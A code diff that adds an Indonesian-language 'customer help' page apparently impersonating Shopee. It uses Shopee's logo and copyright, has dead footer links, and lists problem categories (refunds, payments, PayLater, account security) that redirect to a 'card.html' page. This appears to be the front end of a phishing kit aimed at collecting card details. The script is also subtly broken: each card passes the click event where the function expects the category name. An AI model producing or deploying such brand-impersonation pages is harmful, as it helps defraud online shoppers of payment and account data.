@@ -1,0 +1,249 @@
+<html lang="id">
+ <head> 
+  <meta name="theme-color" content="#ED4D2D"> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <title>Bantuan Pelanggan</title> 
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"> 
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet"> 
+  <style>
+    /* =======================
+       Semua CSS Anda tetap
+       ======================= */
+    :root { --primary: #ee4d2d; --primary-light: #ff6b4a; --secondary: #ffc107; --dark: #2c3e50; --light: #f8f9fa; --gray: #6c757d; --white: #ffffff; --shadow: 0 4px 20px rgba(0,0,0,0.1); --transition: all 0.3s cubic-bezier(0.25,0.8,0.25,1);}
+    *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
+    body{background:linear-gradient(135deg,#f5f7fa 0%,#f8f9fa 100%);color:var(--dark);min-height:100vh;}
+    .container{max-width:414px;margin:0 auto;background-color:var(--white);min-height:100vh;box-shadow:var(--shadow);position:relative;overflow:hidden;display:flex;flex-direction:column;}
+    .header-image{width:100%;height:auto;display:block;transform:scale(1);transition:transform 0.5s ease;}
+    .header-image:hover{transform:scale(1.02);}
+    .content{padding:25px 20px;position:relative;flex:1;}
+    .section-title{font-size:18px;font-weight:600;margin-bottom:25px;color:var(--dark);text-align:center;position:relative;padding-bottom:10px;}
+    .section-title::after{content:'';position:absolute;bottom:0;left:50%;transform:translateX(-50%);width:60px;height:3px;background:linear-gradient(90deg,var(--primary) 0%,var(--secondary) 100%);border-radius:3px;}
+    .problem-card{background-color:var(--white);border-radius:12px;padding:12px;margin-bottom:16px;box-shadow:var(--shadow);border-left:4px solid var(--gray);transition:var(--transition);cursor:pointer;position:relative;overflow:hidden;border:none;}
+    .problem-card::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,rgba(238,77,45,0.1) 0%,rgba(255,193,7,0.05) 100%);opacity:0;transition:var(--transition);}
+    .problem-card:hover{transform:translateY(-5px);box-shadow:0 8px 25px rgba(0,0,0,0.15);}
+    .problem-card:hover::before{opacity:1;}
+    .problem-card.selected{border-left-color:var(--primary);background-color:rgba(238,77,45,0.05);}
+    .problem-card.selected::before{opacity:1;}
+    .problem-title{font-size:16px;font-weight:600;margin-bottom:8px;color:var(--dark);display:flex;align-items:center;}
+    .problem-title i{margin-right:10px;color:var(--primary);font-size:25px;transition:var(--transition);}
+    .problem-card:hover .problem-title i{transform:rotate(15deg) scale(1.1);}
+    .problem-desc{font-size:12px;color:var(--gray);line-height:1.5;padding-left:28px;transition:var(--transition);}
+    .problem-card:hover .problem-desc{color:var(--dark);}
+    .illustration{text-align:center;margin:20px 0 30px;position:relative;}
+    .illustration img{width:140px;height:auto;filter:drop-shadow(0 4px 8px rgba(238,77,45,0.2));transition:all 0.5s ease;}
+    .illustration:hover img{transform:scale(1.05) rotate(-5deg);filter:drop-shadow(0 6px 12px rgba(238,77,45,0.3));}
+    .illustration::after{content:'';position:absolute;bottom:-15px;left:50%;transform:translateX(-50%);width:100px;height:8px;background:linear-gradient(90deg,var(--primary) 0%,var(--secondary) 100%);border-radius:8px;opacity:0.6;filter:blur(4px);transition:var(--transition);}
+    .illustration:hover::after{width:120px;opacity:0.8;}
+    .glow-effect{position:relative;}
+    .glow-effect::after{content:'';position:absolute;top:0;left:0;right:0;bottom:0;border-radius:inherit;box-shadow:0 0 15px rgba(238,77,45,0.4);opacity:0;transition:var(--transition);}
+    .glow-effect:hover::after{opacity:1;}
+    .particles{position:absolute;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden;}
+    .particle{position:absolute;background:rgba(238,77,45,0.1);border-radius:50%;animation:float 15s infinite linear;}
+    @keyframes float{0%{transform:translateY(0) rotate(0deg);}100%{transform:translateY(-1000px) rotate(720deg);}}
+    .fab{position:fixed;bottom:20px;right:20px;width:56px;height:56px;background-color:var(--primary);border-radius:50%;box-shadow:0 4px 12px rgba(238,77,45,0.3);display:flex;align-items:center;justify-content:center;color:white;font-size:24px;cursor:pointer;z-index:100;transition:all 0.3s ease;}
+    .fab:hover{transform:scale(1.1) rotate(15deg);box-shadow:0 6px 16px rgba(238,77,45,0.4);}
+    .notification-badge{position:absolute;top:-5px;right:-5px;background-color:var(--secondary);color:var(--dark);border-radius:50%;width:20px;height:20px;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:bold;animation:pulse 2s infinite;}
+    @keyframes pulse{0%{transform:scale(1);}50%{transform:scale(1.1);}100%{transform:scale(1);}}
+    .loader{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background-color:rgba(255,255,255,0.8);z-index:1000;justify-content:center;align-items:center;flex-direction:column;}
+    .loader-spinner{width:50px;height:50px;border:5px solid rgba(238,77,45,0.2);border-radius:50%;border-top-color:var(--primary);animation:spin 1s ease-in-out infinite;}
+    .loader-text{margin-top:15px;color:var(--primary);font-weight:500;}
+    @keyframes spin{to{transform:rotate(360deg);}}
+    .gradient-border{position:relative;border-radius:12px;overflow:hidden;}
+    .gradient-border::after{content:'';position:absolute;top:-2px;left:-2px;right:-2px;bottom:-2px;background:linear-gradient(45deg,var(--primary),var(--secondary),var(--primary));z-index:-1;border-radius:14px;background-size:200% 200%;animation:gradient 3s ease infinite;}
+    @keyframes gradient{0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
+    .footer{background-color:#f5f5f5;padding:15px 20px;border-top:1px solid #e0e0e0;text-align:center;position:relative;}
+    .footer::before{content:'';position:absolute;top:0;left:0;width:100%;height:3px;background:linear-gradient(90deg,var(--primary) 0%,var(--secondary) 100%);}
+    .footer-links{display:flex;justify-content:center;flex-wrap:wrap;margin-bottom:10px;}
+    .footer-link{color:#666;font-size:12px;margin:0 8px;text-decoration:none;position:relative;transition:var(--transition);}
+    .footer-link:hover{color:var(--primary);}
+    .footer-link::after{content:'';position:absolute;bottom:-2px;left:0;width:0;height:1px;background-color:var(--primary);transition:var(--transition);}
+    .footer-link:hover::after{width:100%;}
+    .footer-separator{color:#ccc;}
+    .footer-copyright{color:#999;font-size:11px;margin-top:8px;}
+    .footer-app{display:flex;justify-content:center;align-items:center;margin-top:10px;}
+    .footer-app img{height:30px;margin:0 5px;transition:var(--transition);cursor:pointer;}
+    .footer-app img:hover{transform:translateY(-3px);}
+    .confetti{position:fixed;width:10px;height:10px;background-color:var(--primary);opacity:0;z-index:999;animation:confetti-fall 3s ease-in-out forwards;}
+    @keyframes confetti-fall{0%{transform:translateY(-100px) rotate(0deg);opacity:1;}100%{transform:translateY(1000px) rotate(720deg);opacity:0;}}
+    .chat-bubble{position:fixed;bottom:85px;right:20px;background-color:var(--primary);color:white;border-radius:20px;padding:10px 15px;font-size:14px;max-width:200px;box-shadow:0 4px 12px rgba(0,0,0,0.1);transform:translateY(20px);opacity:0;transition:all 0.3s ease;z-index:99;}
+    .chat-bubble.show{transform:translateY(0);opacity:1;}
+    .chat-bubble::after{content:'';position:absolute;bottom:-10px;right:20px;border-width:10px 10px 0;border-style:solid;border-color:var(--primary) transparent transparent;}
+  </style> 
+ </head> 
+ <body> 
+  <div class="container"> 
+   <div class="particles" id="particles"></div>
+   <img src="https://cf.shopee.co.id/file/id-11134258-7rbk2-m7q9drlty8iq7e" alt="Bantuan Pelanggan" class="header-image"> 
+   <div class="content"> 
+    <div class="illustration"> 
+     <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" alt="Shopee Logo"> 
+    </div> 
+    <h2 class="section-title">Pilih Jenis Kendala Anda</h2> 
+
+    <!-- Problem Cards -->
+    <div class="problem-card glow-effect gradient-border" onclick="selectProblem(event, 'Pengembalian')"> 
+      <h3 class="problem-title"><i class="fas fa-undo-alt"></i> Pengembalian Barang &amp; Dana</h3> 
+      <p class="problem-desc">Permintaan retur barang, dana belum kembali, atau kendala proses pengembalian</p> 
+    </div> 
+
+    <div class="problem-card glow-effect gradient-border" onclick="selectProblem(event, 'Pembayaran')"> 
+      <h3 class="problem-title"><i class="fas fa-credit-card"></i> Masalah Pembayaran</h3> 
+      <p class="problem-desc">Gagal transaksi, pembayaran tertunda, atau masalah pembayaran lainnya</p> 
+    </div> 
+
+    <div class="problem-card glow-effect gradient-border" onclick="selectProblem(event, 'Pengiriman')"> 
+      <h3 class="problem-title"><i class="fas fa-truck"></i> Masalah Pengiriman</h3> 
+      <p class="problem-desc">Paket tidak sampai, terlambat, atau masalah pengiriman lainnya</p> 
+    </div> 
+
+    <div class="problem-card glow-effect gradient-border" onclick="selectProblem(event, 'Produk')"> 
+      <h3 class="problem-title"><i class="fas fa-box-open"></i> Masalah Produk</h3> 
+      <p class="problem-desc">Produk rusak, tidak sesuai, atau masalah kualitas produk</p> 
+    </div> 
+
+    <div class="problem-card glow-effect gradient-border" onclick="selectProblem(event, 'ShopeePaylater')"> 
+      <h3 class="problem-title"><i class="fas fa-wallet"></i> ShopeePaylater/SPinjam</h3> 
+      <p class="problem-desc">Masalah pembayaran, limit, atau layanan ShopeePaylater dan SPinjam</p> 
+    </div> 
+
+    <div class="problem-card glow-effect gradient-border" onclick="selectProblem(event, 'Akun')"> 
+      <h3 class="problem-title"><i class="fas fa-user-shield"></i> Masalah Akun</h3> 
+      <p class="problem-desc">Login bermasalah, verifikasi, atau keamanan akun</p> 
+    </div> 
+   </div> 
+
+   <!-- Footer -->
+   <div class="footer"> 
+     <div class="footer-links"> 
+       <a href="#" class="footer-link">Tentang Shopee</a> 
+       <span class="footer-separator">|</span> 
+       <a href="#" class="footer-link">Kebijakan Privasi</a> 
+       <span class="footer-separator">|</span> 
+       <a href="#" class="footer-link">Syarat &amp; Ketentuan</a> 
+     </div> 
+     <div class="footer-links"> 
+       <a href="#" class="footer-link">Shopee Careers</a> 
+       <span class="footer-separator">|</span> 
+       <a href="#" class="footer-link">Shopee Policies</a> 
+       <span class="footer-separator">|</span> 
+       <a href="#" class="footer-link">Shopee Blog</a> 
+     </div> 
+     <div class="footer-copyright">© 2023 Shopee. Hak Cipta Dilindungi.</div> 
+     <div class="footer-app"> 
+       <span>Unduh Aplikasi:</span> 
+       <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play" onclick="createConfetti()"> 
+       <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="App Store" onclick="createConfetti()"> 
+     </div> 
+   </div> 
+  </div> 
+
+  <!-- Floating Action Button --> 
+  <div class="fab" onclick="showChatBubble()"> 
+   <i class="fas fa-headset"></i> 
+   <div class="notification-badge">3</div> 
+  </div> 
+
+  <!-- Chat Bubble --> 
+  <div class="chat-bubble" id="chatBubble">
+    Butuh bantuan lebih lanjut? Hubungi customer service kami! 
+  </div> 
+
+  <!-- Loader --> 
+  <div class="loader" id="loader"> 
+   <div class="loader-spinner"></div> 
+   <div class="loader-text">Memproses permintaan Anda...</div> 
+  </div> 
+
+  <!-- Script --> 
+  <script>
+    function createParticles() {
+      const particlesContainer = document.getElementById('particles');
+      const particleCount = 15;
+      for (let i = 0; i < particleCount; i++) {
+        const particle = document.createElement('div');
+        particle.classList.add('particle');
+        const size = Math.random() * 10 + 5;
+        particle.style.width = `${size}px`;
+        particle.style.height = `${size}px`;
+        particle.style.left = `${Math.random() * 100}%`;
+        particle.style.top = `${Math.random() * 100 + 100}%`;
+        particle.style.animationDuration = `${Math.random() * 20 + 10}s`;
+        particle.style.animationDelay = `${Math.random() * 5}s`;
+        const colors = ['rgba(238,77,45,0.1)', 'rgba(255,193,7,0.1)', 'rgba(44,62,80,0.1)'];
+        particle.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+        particlesContainer.appendChild(particle);
+      }
+    }
+
+    function createConfetti() {
+      for (let i = 0; i < 50; i++) {
+        const confetti = document.createElement('div');
+        confetti.classList.add('confetti');
+        const size = Math.random() * 10 + 5;
+        const left = Math.random() * window.innerWidth;
+        const color = `hsl(${Math.random() * 60 + 10}, 100%, 50%)`;
+        const delay = Math.random() * 2;
+        const duration = Math.random() * 3 + 2;
+        
+        confetti.style.width = `${size}px`;
+        confetti.style.height = `${size}px`;
+        confetti.style.left = `${left}px`;
+        confetti.style.backgroundColor = color;
+        confetti.style.animationDelay = `${delay}s`;
+        confetti.style.animationDuration = `${duration}s`;
+        
+        document.body.appendChild(confetti);
+        
+        // Remove confetti after animation
+        setTimeout(() => {
+          confetti.remove();
+        }, duration * 1000);
+      }
+    }
+
+    function showChatBubble() {
+      const chatBubble = document.getElementById('chatBubble');
+      chatBubble.classList.add('show');
+      
+      // Hide after 5 seconds
+      setTimeout(() => {
+        chatBubble.classList.remove('show');
+      }, 5000);
+    }
+
+    function selectProblem(problem) {
+      // Show loader
+      document.getElementById('loader').style.display = 'flex';
+      
+      // Add selected class with animation
+      document.querySelectorAll('.problem-card').forEach(card => {
+        card.classList.remove('selected');
+      });
+      event.currentTarget.classList.add('selected');
+
+      // Bounce effect
+      event.currentTarget.style.transform = 'translateY(2px)';
+      setTimeout(() => {
+        event.currentTarget.style.transform = 'translateY(-5px)';
+      }, 100);
+
+      // Create confetti for selection
+      createConfetti();
+
+      // Simulate loading before redirect
+      setTimeout(() => {
+  window.location.href = `card.html?jenis=${encodeURIComponent(problem)}`;
+}, 1500);
+    }
+
+    // Initialize elements when page loads
+    window.addEventListener('load', () => {
+      createParticles();
+      
+      // Show chat bubble after 3 seconds
+      setTimeout(showChatBubble, 3000);
+    });
+  </script> 
+ </body>
+</html>
